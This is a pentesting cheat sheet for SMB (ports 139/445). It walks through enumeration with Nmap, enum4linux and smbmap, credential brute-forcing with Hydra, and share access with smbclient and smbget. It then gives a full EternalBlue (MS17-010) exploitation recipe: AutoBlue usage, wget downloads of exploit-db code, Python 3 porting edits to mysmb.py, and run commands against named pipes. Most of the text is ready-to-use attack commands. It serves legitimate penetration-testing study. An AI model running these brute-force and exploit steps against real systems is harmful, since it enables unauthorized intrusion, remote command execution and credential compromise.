---
title: Server Message Block (SMB) Pentesting
desc: Default port is 139, 445.
tags: [139, 445, Active Directory, EternalBlue, Hydra, Nmap, Samba, SMB, Windows]
alts: []
render_with_liquid: false
---

## 1. Enumeration

1. **Use Nmap**

    ```sh
    nmap --script smb-brute -p 445 <target-ip>
    nmap --script smb-enum-shares.nse,smb-enum-users.nse -p 445 <target-ip>
    nmap --script smb-enum* -p 445 <target-ip>
    nmap --script smb-protocols -p 445 <target-ip>
    nmap --script smb-vuln* -p 445 <target-ip>
    ```

2. **Use Enum4linux**

    ```sh
    # Basic
    enum4linux 10.0.0.1

    # All enumeration
    enum4linux -a 10.0.0.1

    # Verbose
    enum4linux -v 10.0.0.1

    # Specify username and password
    enum4linux -u username -p password 10.0.0.1
    ```

3. **Use Smbmap**

    ```sh
    smbmap -H <target-ip>

    # Recursive
    smbmap -H <target-ip> -R

    # Username and password
    smbmap -u username -p password -H <target-ip>

    # Execute a command
    smbmap -u username -p password -H <target-ip> -x 'ipconfig'
    ```

3. **Brute Force Credentials**

    ```sh
    hydra -l username -P passwords.txt <target-ip> smb
    hydra -L usernames.txt -p password <target-ip> smb
    ```

<br />

## 2. Connect

1. **Use Smbclient**

    ```sh
    smbclient -L 10.0.0.1
    smbclient -N -L 10.0.0.1
    smbclient -N -L \\\\10.0.0.1
    smbclient -L 10.0.0.1 -U username

    # Specify shared directory
    smbclient //10.0.0.1/somedir -U username
    # nobody, no-pass
    smbclient //10.0.0.1/somedir -N -U nobody

    # Specify workgroup
    smbclient -L 10.0.0.1 -W WORKGROUP -U username
    ```

    - **Download Shares**

        ```sh
        smbget -R smb://10.0.0.1/somedir -U username

        # Specify workgroup
        smbget -R smb://10.0.0.1/somedir -w WORKGROUP -U username
        ```

<br />

## 3. EternalBlue (MS17-010)

1. **Use AutoBlue**

    **[AutoBlue](https://github.com/3ndG4me/AutoBlue-MS17-010){:target="_blank"}** is an automatic exploit.  
    Download the repository and run the following example command.

    ```sh
    python zzz_exploit.py -target-ip <target-ip> -port 445 'username:password@target'
    ```

2. **Manual Exploiting**

    You need to have two files - exploit.py, mysmb.py

    - **Download mysmb.py**

        ```sh
        wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/42315.py -O mysmb.py 

        # Convert DOS to UNIX
        dos2unix mysmb.py
        ```

    - **Edit Some Lines of mysmb.py for Python3**

        You need to edit some code because this exploit is old so only supports **Python2**.

        ```sh
        Line.69
        # transData = b''
        transData = ''

        Line.73
        # transData = ('\x00' * padLen) + str(parameters)
        transData = "".join(map(chr,(b'\x00' * padLen))) + str(parameters)

        Line.80
        # transData += ('\x00' * padLen) + data
        transData += "".join(map(chr,(b'\x00' * padLen))) + str(data)

        Line.231
        # req = str(pkt)
        req = pkt.getData()
        return b'\x00'*2 + pack('>H', len(req)) + req  # assume length is <6553

        Line.381
        # data += resp['Data'][1:]
        data += resp['Data'][1:].decode()
        ```

    - **Download exploit.py**

        ```sh
        wget -O exploit.py https://www.exploit-db.com/exploits/42315

        # Convert DOS to UNIX
        dos2unix exploit.py
        ```

    - **Edit the Credentials in exploit.py**

        ```sh

        ...
        username = "username"
        password = "password"
        ...

        ```

    - **Run**

        ```sh
        python exploit.py 10.0.0.1 netlogon
        python exploit.py 10.0.0.1 lsarpc
        python exploit.py 10.0.0.1 samr
        ```